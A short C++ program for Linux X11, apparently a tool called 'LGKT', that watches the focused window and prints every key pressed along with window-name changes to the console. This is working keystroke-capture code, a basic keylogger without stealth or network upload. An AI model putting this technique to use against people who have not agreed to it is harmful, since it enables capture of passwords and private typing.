#include <X11/X.h>
#include <X11/Xutil.h>
#include <X11/Xlib.h>
#include <iostream>

using namespace std;

int error_handler(Display* d, XErrorEvent* err) {
  cout << "error" << endl;
  return 0;
}

// gets and formats the raw name of the currently active window
char* get_window_name(Display* display, Window window) {
  Atom actual_type, property = XInternAtom(display, "WM_NAME", False);
  int actual_format;
  unsigned long remaining, size;
  unsigned char* data;

  int result = XGetWindowProperty(display, window, property, 0, 1024, False, AnyPropertyType, &actual_type, &actual_format, &size, &remaining, &data);
  if (result != Success) return NULL;

  return (char*)data;
}

int main(int argc, char* argv[]) {
  // opens the X11 display
  // unlike the naming suggests, it captures events on all displays
  // even when an external display is plugged in
  Display* display = XOpenDisplay(NULL);
  Window active_window = -1;
  Window root = DefaultRootWindow(display);

  int revert_to;

  XGetInputFocus(display, &active_window, &revert_to);
  XSelectInput(display, active_window, KeyPressMask|KeyReleaseMask|FocusChangeMask);
  XSetErrorHandler(error_handler);

  char* active_window_name = get_window_name(display, active_window);
  cout << "LGKT intialized, " << active_window_name << endl;

  while (True) {
    XEvent ev;
    // gets the next X11 event
    XNextEvent(display, &ev);

    switch(ev.type) {
    case FocusOut:
    {
      XGetInputFocus(display, &active_window, &revert_to);
      if (active_window == 1) break; //TODO: test what happens if we dont do this
      if (active_window == PointerRoot) {
        active_window = root;
      }
      char* new_name = get_window_name(display, active_window);
      if (new_name != NULL) {
        if (active_window_name != NULL) {
          if (string(new_name).compare(string(active_window_name)) != 0) {
            // change detected
            cout << "Changed to: " << string(new_name) << endl;
          }
        }
        else {
            cout << "not Changed to: " << string(new_name) << endl;
        }
        active_window_name = new_name;
      }
      XSelectInput(display, active_window, KeyPressMask|KeyReleaseMask|FocusChangeMask);
      break;
    }
    case KeyPress:
      {
        if (active_window_name != NULL) {
          char buf[17];
          KeySym ks;
          XComposeStatus compose_status;
          int len = XLookupString(&ev.xkey, buf, 16, &ks, &compose_status);
          if (len > 0 && isprint(buf[0])) {
            buf[len] = 0;
            cout << "Press: " << buf << endl;
          } else {
            cout << "Code: " << (int)ks << endl;
          }
        }
        break;
      }
    }
  }

  // make sure to close it
  XCloseDisplay(display);
}
